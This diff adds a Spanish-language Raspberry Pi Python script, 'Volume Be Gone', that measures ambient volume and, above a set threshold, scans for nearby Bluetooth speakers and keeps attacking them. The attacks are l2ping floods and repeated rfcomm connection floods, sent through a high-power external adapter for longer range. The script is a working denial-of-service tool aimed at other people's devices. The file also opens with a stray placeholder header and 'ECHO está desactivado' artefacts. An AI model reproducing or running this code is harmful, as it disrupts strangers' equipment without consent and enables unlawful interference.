@@ -1,0 +1,615 @@
+#/usr/bin/env python
+# -*- coding: utf-8 -*-
+"""
+Volume Be Gone - Bluetooth Speaker Control by Volume Level
+ECHO est� desactivado.
+Control automatico de parlantes Bluetooth basado en nivel de volumen ambiental.
+Utiliza un encoder rotativo para configurar el umbral de activacion.
+ECHO est� desactivado.
+Author: [Tu Nombre]
+License: MIT
+Version: 2.0
+"""
+
+# El codigo completo debe ser copiado aqui
+# Este es solo un placeholder para la estructura
+
+print("Volume Be Gone v2.0")
+print("Copia el codigo completo de volumeBeGone.py aqui")
+print("Ver documentacion en /docs")
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+# Volume Be Gone - Control de parlantes BT por nivel de volumen
+# Versión con encoder rotativo para control de umbral
+# Basado en Reggaeton Be Gone de Roni Bandini
+# MIT License
+
+import os
+import subprocess
+import sys
+import signal
+import time
+import datetime
+import numpy as np
+import sounddevice as sd
+from RPi import GPIO
+import Adafruit_GPIO.SPI as SPI
+import Adafruit_SSD1306
+from PIL import Image
+from PIL import ImageDraw
+from PIL import ImageFont
+import threading
+import bluetooth
+import math
+import json
+
+# Configuración
+myPath="/home/pi/volumebegone/"
+threshold_db = 70  # Umbral inicial en decibeles
+min_threshold_db = 70  # Umbral mínimo
+max_threshold_db = 120  # Umbral máximo
+packagesSize = 800
+threadsCount = 1000
+myDelay = 0.1
+sample_rate = 44100
+chunk_size = 4096
+calibration_offset = 94  # Offset de calibración del micrófono
+
+# Configuración de adaptador Bluetooth
+# hci0 = Bluetooth interno de RPi
+# hci1 = Adaptador USB externo (Clase 1)
+bt_interface = "hci1"  # Cambiar a "hci0" para usar el interno
+use_external_adapter = True  # True para usar adaptador USB
+
+# Lista de dispositivos BT encontrados
+bt_devices = []
+attack_threads = []
+scanning = False
+monitoring = False
+config_mode = True  # Modo configuración al inicio
+
+# Encoder rotativo KY-040
+GPIO.setwarnings(False)
+GPIO.setmode(GPIO.BCM)
+encoder_clk = 19  # CLK del encoder (Pin 35)
+encoder_dt = 13   # DT del encoder (Pin 33)
+encoder_sw = 26   # Switch/botón del encoder (Pin 37)
+
+# Variables del encoder
+encoder_last_clk = GPIO.HIGH
+encoder_counter = 0
+last_encoder_time = 0
+fast_rotation_threshold = 0.05  # 50ms para detectar giro rápido
+
+# Oled screen
+RST = None
+DC = 23
+SPI_PORT = 0
+SPI_DEVICE = 0
+# Cambiado para pantalla 128x64
+disp = Adafruit_SSD1306.SSD1306_128_64(rst=RST)
+disp.begin()
+disp.clear()
+disp.display()
+font = ImageFont.truetype('whitrabt.ttf', 12)
+font_small = ImageFont.truetype('whitrabt.ttf', 10)
+width = disp.width
+height = disp.height
+image = Image.new('1', (width, height))
+draw = ImageDraw.Draw(image)
+draw.rectangle((0,0,width,height), outline=0, fill=0)
+padding = -2
+top = padding
+bottom = height-padding
+x = 0
+
+def setup_encoder():
+    """Configura el encoder rotativo"""
+    GPIO.setup(encoder_clk, GPIO.IN, pull_up_down=GPIO.PUD_UP)
+    GPIO.setup(encoder_dt, GPIO.IN, pull_up_down=GPIO.PUD_UP)
+    GPIO.setup(encoder_sw, GPIO.IN, pull_up_down=GPIO.PUD_UP)
+    
+    # Configurar interrupciones
+    GPIO.add_event_detect(encoder_clk, GPIO.BOTH, callback=encoder_rotation_callback, bouncetime=2)
+    GPIO.add_event_detect(encoder_sw, GPIO.FALLING, callback=encoder_button_callback, bouncetime=300)
+
+def encoder_rotation_callback(channel):
+    """Maneja la rotación del encoder"""
+    global threshold_db, encoder_last_clk, last_encoder_time, config_mode
+    
+    if not config_mode:
+        return
+    
+    try:
+        clk_state = GPIO.input(encoder_clk)
+        dt_state = GPIO.input(encoder_dt)
+        
+        current_time = time.time()
+        time_diff = current_time - last_encoder_time
+        
+        if clk_state != encoder_last_clk and clk_state == GPIO.LOW:
+            # Determinar velocidad de rotación
+            if time_diff < fast_rotation_threshold:
+                step = 5  # Giro rápido: incrementos de 5dB
+            else:
+                step = 1  # Giro lento: incrementos de 1dB
+            
+            if dt_state != clk_state:
+                # Giro horario - aumentar
+                if threshold_db < max_threshold_db:
+                    threshold_db = min(threshold_db + step, max_threshold_db)
+                    update_config_screen()
+            else:
+                # Giro antihorario - disminuir
+                if threshold_db > min_threshold_db:
+                    threshold_db = max(threshold_db - step, min_threshold_db)
+                    update_config_screen()
+            
+            last_encoder_time = current_time
+        
+        encoder_last_clk = clk_state
+        
+    except Exception as e:
+        print(f"[!] Error en encoder: {e}")
+
+def encoder_button_callback(channel):
+    """Maneja el botón del encoder"""
+    global config_mode, monitoring
+    
+    time.sleep(0.05)  # Anti-rebote adicional
+    
+    if GPIO.input(encoder_sw) == GPIO.LOW:
+        if config_mode:
+            # En modo config: confirmar y comenzar
+            config_mode = False
+            save_config()
+            print(f"[*] Configuración confirmada: {threshold_db} dB")
+        elif monitoring:
+            # Durante monitoreo: verificar si es presión larga para reset
+            start_time = time.time()
+            while GPIO.input(encoder_sw) == GPIO.LOW:
+                if time.time() - start_time > 2:  # 2 segundos
+                    print("[*] Reiniciando...")
+                    monitoring = False
+                    os.system("pkill -f l2ping")
+                    os.system("pkill -f rfcomm")
+                    time.sleep(1)
+                    os.execv(sys.executable, ['python3'] + sys.argv)
+                time.sleep(0.1)
+
+def update_config_screen():
+    """Actualiza la pantalla en modo configuración con barra visual"""
+    image = Image.new('1', (width, height))
+    draw = ImageDraw.Draw(image)
+    draw.rectangle((0,0,width,height), outline=0, fill=0)
+    
+    # Título
+    draw.text((x, top+2), "Volume BeGone", font=font, fill=255)
+    draw.text((x, top+14), "Config. Umbral:", font=font, fill=255)
+    
+    # Valor actual grande
+    draw.text((x+30, top+28), f"{threshold_db} dB", font=font, fill=255)
+    
+    # Barra de progreso
+    bar_y = top + 45
+    bar_height = 8
+    bar_width = 120
+    bar_x = 4
+    
+    # Marco de la barra
+    draw.rectangle((bar_x, bar_y, bar_x + bar_width, bar_y + bar_height), outline=255, fill=0)
+    
+    # Relleno de la barra
+    fill_width = int((threshold_db - min_threshold_db) * bar_width / (max_threshold_db - min_threshold_db))
+    draw.rectangle((bar_x + 2, bar_y + 2, bar_x + fill_width, bar_y + bar_height - 2), outline=255, fill=255)
+    
+    # Instrucciones
+    draw.text((x, top+56), "Gira:Ajustar OK:Iniciar", font=font_small, fill=255)
+    
+    disp.image(image)
+    disp.display()
+
+def writeLog(myLine):
+    """Escribe en el archivo de log"""
+    now = datetime.datetime.now()
+    dtFormatted = now.strftime("%Y-%m-%d %H:%M:%S")
+    with open('log.txt', 'a') as f:
+        myLine = str(dtFormatted) + "," + myLine
+        f.write(myLine + "\n")
+
+def updateScreen(message1, message2, message3="", message4=""):
+    """Actualiza la pantalla OLED 128x64"""
+    image = Image.new('1', (width, height))
+    draw = ImageDraw.Draw(image)
+    draw.rectangle((0,0,width,height), outline=0, fill=0)
+    padding = -2
+    x = 0
+    top = padding
+    
+    # Con 64 píxeles tienes más espacio
+    draw.text((x, top+2), "Volume BeGone", font=font, fill=255)
+    draw.text((x, top+16), message1, font=font, fill=255)
+    draw.text((x, top+28), message2, font=font, fill=255)
+    if message3:
+        draw.text((x, top+40), message3, font=font, fill=255)
+    if message4:
+        draw.text((x, top+52), message4, font=font_small, fill=255)
+    
+    disp.image(image)
+    disp.display()
+
+def draw_volume_meter(db_level):
+    """Dibuja un medidor visual del nivel de volumen"""
+    image = Image.new('1', (width, height))
+    draw = ImageDraw.Draw(image)
+    draw.rectangle((0,0,width,height), outline=0, fill=0)
+    
+    # Título
+    draw.text((x, top+2), "Volume BeGone", font=font, fill=255)
+    
+    # Nivel actual
+    draw.text((x, top+14), f"Nivel: {db_level:.1f} dB", font=font, fill=255)
+    draw.text((x, top+26), f"Umbral: {threshold_db} dB", font=font, fill=255)
+    
+    # Medidor visual
+    meter_y = top + 40
+    meter_height = 10
+    meter_width = 120
+    meter_x = 4
+    
+    # Marco del medidor
+    draw.rectangle((meter_x, meter_y, meter_x + meter_width, meter_y + meter_height), outline=255, fill=0)
+    
+    # Nivel actual
+    if db_level > 0:
+        level_width = int(min(db_level, 120) * meter_width / 120)
+        draw.rectangle((meter_x + 2, meter_y + 2, meter_x + level_width, meter_y + meter_height - 2), 
+                      outline=255, fill=255)
+    
+    # Línea del umbral
+    threshold_x = meter_x + int(threshold_db * meter_width / 120)
+    draw.line((threshold_x, meter_y - 2, threshold_x, meter_y + meter_height + 2), fill=255, width=2)
+    
+    # Estado
+    status = "ACTIVO!" if db_level > threshold_db else "Monitoreando"
+    draw.text((x, top+54), f"Disp:{len(bt_devices)} {status}", font=font_small, fill=255)
+    
+    disp.image(image)
+    disp.display()
+
+def check_bluetooth_adapters():
+    """Verifica adaptadores Bluetooth disponibles"""
+    global bt_interface, use_external_adapter
+    
+    try:
+        # Verificar qué adaptadores están disponibles
+        result = subprocess.run(['hciconfig'], capture_output=True, text=True)
+        adapters = []
+        
+        for line in result.stdout.split('\n'):
+            if line.startswith('hci'):
+                adapter = line.split(':')[0]
+                adapters.append(adapter)
+        
+        print(f"[*] Adaptadores encontrados: {adapters}")
+        writeLog(f"Adaptadores BT: {adapters}")
+        
+        # Si hay adaptador externo (hci1) y está configurado para usarlo
+        if use_external_adapter and 'hci1' in adapters:
+            bt_interface = "hci1"
+            print("[*] Usando adaptador externo (hci1) - Clase 1")
+            
+            # Configurar adaptador externo para máxima potencia
+            os.system(f"sudo hciconfig {bt_interface} up")
+            os.system(f"sudo hciconfig {bt_interface} class 0x000100")
+            os.system(f"sudo hciconfig {bt_interface} lm master")
+            os.system(f"sudo hciconfig {bt_interface} lp active,master")
+            
+        else:
+            bt_interface = "hci0"
+            print("[*] Usando adaptador interno (hci0)")
+            os.system(f"sudo hciconfig {bt_interface} up")
+            
+        return True
+        
+    except Exception as e:
+        print(f"[!] Error verificando adaptadores: {e}")
+        return False
+
+def save_config():
+    """Guarda la configuración actual"""
+    config = {
+        'threshold_db': threshold_db,
+        'calibration_offset': calibration_offset,
+        'use_external_adapter': use_external_adapter
+    }
+    try:
+        with open('/home/pi/volumebegone/config.json', 'w') as f:
+            json.dump(config, f)
+        writeLog(f"Configuración guardada: Umbral={threshold_db}dB, Adaptador={'Externo' if use_external_adapter else 'Interno'}")
+    except Exception as e:
+        print(f"[!] Error guardando configuración: {e}")
+
+def load_config():
+    """Carga la configuración guardada"""
+    global threshold_db, calibration_offset, use_external_adapter
+    try:
+        with open('/home/pi/volumebegone/config.json', 'r') as f:
+            config = json.load(f)
+            threshold_db = config.get('threshold_db', 70)
+            calibration_offset = config.get('calibration_offset', 94)
+            use_external_adapter = config.get('use_external_adapter', True)
+            print(f"[*] Configuración cargada: Umbral={threshold_db}dB, Adaptador={'Externo' if use_external_adapter else 'Interno'}")
+    except:
+        print("[*] Usando configuración por defecto")
+
+def calculate_db(audio_data):
+    """Calcula el nivel de dB del audio"""
+    # Eliminar valores cero para evitar log(0)
+    audio_data = audio_data[audio_data != 0]
+    if len(audio_data) == 0:
+        return -np.inf
+    
+    # Calcular RMS (Root Mean Square)
+    rms = np.sqrt(np.mean(audio_data**2))
+    
+    # Convertir a dB (20 * log10(rms))
+    if rms > 0:
+        db = 20 * np.log10(rms) + calibration_offset
+    else:
+        db = -np.inf
+    
+    return db
+
+def scan_bluetooth_devices():
+    """Escanea dispositivos Bluetooth cercanos"""
+    global bt_devices, scanning, bt_interface
+    scanning = True
+    
+    print(f"[*] Escaneando dispositivos Bluetooth usando {bt_interface}...")
+    updateScreen("Escaneando BT...", f"Adaptador: {bt_interface}", "Buscando parlantes...")
+    
+    try:
+        # Hacer el adaptador BT descubrible
+        os.system(f"hciconfig {bt_interface} piscan")
+        
+        # Escaneo más agresivo para adaptador externo
+        if use_external_adapter and bt_interface == "hci1":
+            # Aumentar ventana de escaneo para Clase 1
+            os.system(f"hcitool -i {bt_interface} cmd 0x03 0x001A 0x00 0x10 0x00 0x10")
+        
+        # Descubrir dispositivos
+        nearby_devices = bluetooth.discover_devices(duration=10, lookup_names=True, 
+                                                   flush_cache=True, lookup_class=True,
+                                                   device_id=1 if bt_interface == "hci1" else 0)
+        
+        bt_devices = []
+        for addr, name, device_class in nearby_devices:
+            # Filtrar por clase de dispositivo de audio (0x240000)
+            if device_class & 0x240000 == 0x240000:  # Audio/Video devices
+                bt_devices.append({
+                    'addr': addr,
+                    'name': name if name else "Unknown",
+                    'class': device_class
+                })
+                print(f"[+] Encontrado: {addr} - {name}")
+        
+        print(f"[*] Total dispositivos de audio encontrados: {len(bt_devices)}")
+        writeLog(f"Dispositivos BT encontrados: {len(bt_devices)} usando {bt_interface}")
+        
+    except Exception as e:
+        print(f"[!] Error escaneando: {e}")
+        writeLog(f"Error en escaneo BT: {str(e)}")
+    
+    scanning = False
+    return bt_devices
+
+def attack_device(device_addr, device_name, method=2):
+    """Ataca un dispositivo específico"""
+    global bt_interface
+    
+    print(f"[*] Atacando {device_addr} ({device_name}) via {bt_interface}")
+    writeLog(f"Atacando dispositivo: {device_addr} - {device_name} usando {bt_interface}")
+    
+    if method == 1:
+        # Método 1: Conexión RFCOMM
+        for i in range(10):  # Intentos limitados
+            try:
+                subprocess.call(['rfcomm', '-i', bt_interface, 'connect', device_addr, '1'], timeout=5)
+            except:
+                pass
+            time.sleep(0.1)
+    
+    elif method == 2:
+        # Método 2: L2CAP ping flood
+        for i in range(10):
+            try:
+                os.system(f'l2ping -i {bt_interface} -s {packagesSize} -f {device_addr} &')
+            except:
+                pass
+            time.sleep(0.1)
+    
+    elif method == 3:
+        # Método 3: Conexión múltiple a servicios
+        for i in range(10):
+            try:
+                # Intentar conectar a diferentes puertos/servicios
+                for port in [1, 3, 5, 17, 19]:  # Puertos comunes de audio BT
+                    subprocess.Popen(['rfcomm', '-i', bt_interface, 'connect', device_addr, str(port)])
+                    time.sleep(0.05)
+            except:
+                pass
+
+def continuous_attack():
+    """Ataque continuo a todos los dispositivos encontrados"""
+    global bt_devices
+    
+    while monitoring:
+        if bt_devices:
+            for device in bt_devices:
+                if not monitoring:
+                    break
+                    
+                # Rotar entre métodos de ataque
+                for method in [2, 1, 3]:
+                    attack_device(device['addr'], device['name'], method)
+                    
+                    if not monitoring:
+                        break
+                    time.sleep(0.5)
+        else:
+            time.sleep(1)
+
+def monitor_volume():
+    """Monitorea el nivel de volumen continuamente"""
+    global monitoring, bt_devices, config_mode
+    
+    # Variables para el cálculo de dB promedio
+    db_history = []
+    history_size = 10
+    
+    def audio_callback(indata, frames, time, status):
+        if status or config_mode:
+            return
+        
+        # Calcular nivel de dB
+        db_level = calculate_db(indata.flatten())
+        
+        # Mantener historial para promedio
+        if db_level > -np.inf:
+            db_history.append(db_level)
+            if len(db_history) > history_size:
+                db_history.pop(0)
+            
+            # Calcular promedio
+            avg_db = np.mean(db_history)
+            
+            # Mostrar medidor visual
+            draw_volume_meter(avg_db)
+            
+            # Si supera el umbral, activar ataque
+            if avg_db > threshold_db and not scanning:
+                print(f"[!] Umbral superado: {avg_db:.1f} dB")
+                writeLog(f"Umbral superado: {avg_db:.1f} dB")
+                
+                # Escanear si no hay dispositivos
+                if not bt_devices:
+                    scan_thread = threading.Thread(target=scan_bluetooth_devices)
+                    scan_thread.start()
+    
+    # Iniciar stream de audio
+    with sd.InputStream(callback=audio_callback, 
+                       channels=1,
+                       samplerate=sample_rate,
+                       blocksize=chunk_size):
+        print("[*] Monitoreando nivel de audio...")
+        writeLog(f"Iniciado monitoreo de volumen - Umbral: {threshold_db} dB")
+        
+        while monitoring:
+            time.sleep(0.1)
+
+def signal_handler(sig, frame):
+    """Maneja la interrupción del programa"""
+    global monitoring
+    print('\n[*] Interrumpido')
+    writeLog("Interrumpido")
+    monitoring = False
+    
+    # Detener todos los procesos de ataque
+    os.system("pkill -f l2ping")
+    os.system("pkill -f rfcomm")
+    
+    GPIO.cleanup()
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
+
+def main():
+    global monitoring, bt_devices, config_mode, threshold_db, bt_interface
+    
+    print("")
+    print("Volume Be Gone 2.0 - Edición Encoder")
+    print("Control de parlantes BT por nivel de volumen")
+    print("Gira el encoder para ajustar, presiona OK para iniciar")
+    print("")
+    
+    # Configurar encoder
+    setup_encoder()
+    
+    # Cargar configuración previa
+    load_config()
+    
+    # Verificar adaptadores Bluetooth
+    if not check_bluetooth_adapters():
+        print("[!] Error: No se detectaron adaptadores Bluetooth")
+        return
+    
+    writeLog(f"Iniciado - Volume Be Gone 2.0 Encoder - Adaptador: {bt_interface}")
+    
+    # Mostrar logo inicial
+    try:
+        image = Image.open(myPath+'images/logo.png').convert('1')
+        disp.image(image)
+        disp.display()
+        time.sleep(2)
+    except:
+        pass
+    
+    # Modo configuración
+    update_config_screen()
+    print(f"[*] Modo configuración - Umbral actual: {threshold_db} dB")
+    print(f"[*] Usando adaptador: {bt_interface} ({'Externo Clase 1' if bt_interface == 'hci1' else 'Interno'})")
+    print("[*] Gira para ajustar, presiona para continuar")
+    
+    # Esperar configuración
+    while config_mode:
+        time.sleep(0.1)
+    
+    print(f"[*] Iniciando sistema con umbral: {threshold_db} dB")
+    writeLog(f"Sistema activado - Umbral: {threshold_db} dB - Adaptador: {bt_interface}")
+    
+    # Escaneo inicial
+    updateScreen("Escaneando BT...", f"Adaptador: {bt_interface}", "Alcance extendido" if bt_interface == "hci1" else "")
+    bt_devices = scan_bluetooth_devices()
+    
+    if bt_devices:
+        updateScreen(f"Encontrados:", f"{len(bt_devices)} dispositivos", f"Umbral: {threshold_db}dB", "Hold 2s: Reset")
+    else:
+        updateScreen("Sin dispositivos", "Monitoreando...", f"Umbral: {threshold_db}dB", "Hold 2s: Reset")
+    
+    time.sleep(2)
+    
+    # Iniciar monitoreo
+    monitoring = True
+    
+    # Thread para ataque continuo
+    attack_thread = threading.Thread(target=continuous_attack)
+    attack_thread.daemon = True
+    attack_thread.start()
+    
+    # Thread para re-escaneo periódico
+    def periodic_scan():
+        while monitoring:
+            time.sleep(30)  # Re-escanear cada 30 segundos
+            if monitoring and not scanning and not config_mode:
+                scan_bluetooth_devices()
+    
+    scan_thread = threading.Thread(target=periodic_scan)
+    scan_thread.daemon = True
+    scan_thread.start()
+    
+    # Monitorear volumen
+    try:
+        monitor_volume()
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        writeLog(f"Error en monitoreo: {str(e)}")
+    finally:
+        monitoring = False
+        os.system("pkill -f l2ping")
+        os.system("pkill -f rfcomm")
+        GPIO.cleanup()
+
+if __name__ == '__main__':
+    main()
